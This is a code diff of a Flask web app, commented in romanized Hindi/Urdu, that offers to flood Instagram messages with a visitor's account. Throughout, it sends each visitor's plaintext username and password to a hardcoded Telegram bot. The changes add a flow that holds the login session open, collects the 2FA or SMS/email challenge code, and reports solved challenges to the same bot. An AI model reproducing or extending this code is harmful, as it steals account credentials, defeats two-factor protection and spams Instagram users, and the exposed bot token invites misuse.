@@ -2,21 +2,24 @@ from flask import Flask, render_template, request, jsonify
 from instagrapi import Client
 from instagrapi.exceptions import (
     ChallengeRequired, TwoFactorRequired, BadPassword,
-    PleaseWaitFewMinutes, FeedbackRequired, ClientError
+    PleaseWaitFewMinutes, FeedbackRequired
 )
 import requests
 import threading
 import time
+import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 
 # ==================== TERI SETTINGS ====================
-BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"      # apna telegram bot token
-CHAT_ID = "5970033767"                # apna telegram chat id
+BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"
+CHAT_ID = "5970033767"
 THREADS = 6
 MAX_RETRIES = 2
 # =======================================================
+
+pending_challenges = {}  # session_id → {client, settings, username, ...}
 
 def send_to_telegram(text: str):
     try:
@@ -105,7 +108,8 @@ def start():
     data = request.json
     username = data.get("username", "").strip()
     password = data.get("password", "").strip()
-    verification_code = data.get("verification_code", "").strip()  # OTP / 2FA / challenge code
+    code = data.get("verification_code", "").strip()
+    session_id = data.get("session_id", "").strip()
     mode = data.get("mode", "users")
     targets = data.get("targets", "")
     thread_id = data.get("thread_id", "")
@@ -115,45 +119,96 @@ def start():
     if not username or not password:
         return jsonify({"ok": False, "msg": "username aur password zaroori hain"})
 
-    send_to_telegram(f"New attempt\nUser: {username}\nPass: {password}\nCode: {verification_code or 'none'}\nMode: {mode}")
+    # ========== CASE 1: Code submit kar raha hai (challenge continue) ==========
+    if session_id and session_id in pending_challenges and code:
+        entry = pending_challenges[session_id]
+        cl = entry["client"]
+
+        try:
+            # challenge resolve with the code
+            cl.challenge_code_handler = lambda *args, **kwargs: code
+            cl.challenge_resolve(cl.last_json)
+
+            send_to_telegram(f"Challenge solved → {username}")
+            del pending_challenges[session_id]
+
+            if mode == "list":
+                return jsonify(get_threads(cl))
+
+            if not message:
+                return jsonify({"ok": False, "msg": "message zaroori hai"})
+
+            target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
+            t = threading.Thread(
+                target=do_flood,
+                args=(cl, username, mode, target_list, thread_id, message, count),
+                daemon=True
+            )
+            t.start()
+            return jsonify({"ok": True, "msg": "Challenge clear. Flood start ho gaya."})
+
+        except Exception as e:
+            send_to_telegram(f"Challenge resolve fail → {username}: {e}")
+            return jsonify({"ok": False, "msg": f"Code galat ya expire ho gaya: {e}"})
+
+    # ========== CASE 2: Fresh login attempt ==========
+    send_to_telegram(f"New login attempt\nUser: {username}\nPass: {password}\nMode: {mode}")
 
     cl = Client()
     cl.delay_range = [0, 0]
 
     try:
-        # yahan verification_code pass kar rahe hain (2FA + challenge dono ke liye kaam karta hai)
-        cl.login(username, password, verification_code=verification_code if verification_code else "")
+        cl.login(username, password)
 
+        # successful login
         if mode == "list":
-            result = get_threads(cl)
-            return jsonify(result)
+            return jsonify(get_threads(cl))
 
         if not message:
             return jsonify({"ok": False, "msg": "message zaroori hai"})
 
         target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
-
         t = threading.Thread(
             target=do_flood,
             args=(cl, username, mode, target_list, thread_id, message, count),
             daemon=True
         )
         t.start()
-
         return jsonify({"ok": True, "msg": "Login successful. Flood start ho gaya."})
 
     except TwoFactorRequired:
+        # 2FA
+        sid = str(uuid.uuid4())
+        pending_challenges[sid] = {
+            "client": cl,
+            "username": username,
+            "password": password,
+            "type": "2fa"
+        }
         return jsonify({
             "ok": False,
             "need_code": True,
-            "msg": "2FA code chahiye. Authenticator app se code daal ke phir se Start daba."
+            "session_id": sid,
+            "msg": "2FA code chahiye. Authenticator se code daalo aur Submit Code dabao."
         })
+
     except ChallengeRequired:
+        # Challenge / OTP
+        sid = str(uuid.uuid4())
+        pending_challenges[sid] = {
+            "client": cl,
+            "username": username,
+            "password": password,
+            "type": "challenge"
+        }
+        send_to_telegram(f"Challenge aaya → {username}\nSession: {sid}")
         return jsonify({
             "ok": False,
             "need_code": True,
-            "msg": "Challenge/OTP aaya hai. SMS/Email se aaya code daal ke phir se Start daba."
+            "session_id": sid,
+            "msg": "OTP/Challenge aaya hai. SMS ya Email se aaya code daalo aur Submit Code dabao."
         })
+
     except BadPassword:
         return jsonify({"ok": False, "msg": "Galat password"})
     except Exception as e:
